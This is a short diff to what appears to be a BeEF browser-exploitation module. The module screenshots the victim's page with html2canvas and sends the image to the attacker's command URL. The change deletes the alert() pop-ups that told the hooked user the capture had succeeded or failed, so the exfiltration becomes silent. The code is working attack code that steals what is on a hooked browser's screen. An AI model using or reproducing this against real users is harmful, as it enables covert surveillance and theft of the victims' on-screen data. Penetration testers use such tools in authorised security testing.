@@ -11,13 +11,10 @@ beef.execute(function() {
 			html2canvas(document.body).then(function(canvas) {
 	    		var d = canvas.toDataURL('image/png');
 	    		beef.net.send('<%= @command_url %>', <%= @command_id %>, 'image=' + d );
-	    		ret = true;
-	    		alert('Did it.');
 	    	});
 	    }
 	    catch (e) {
 	    	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'result=Obtaining snapshot failed: ' + e.message);
-	    	alert('FAILED.');
 	    }
 	};
 
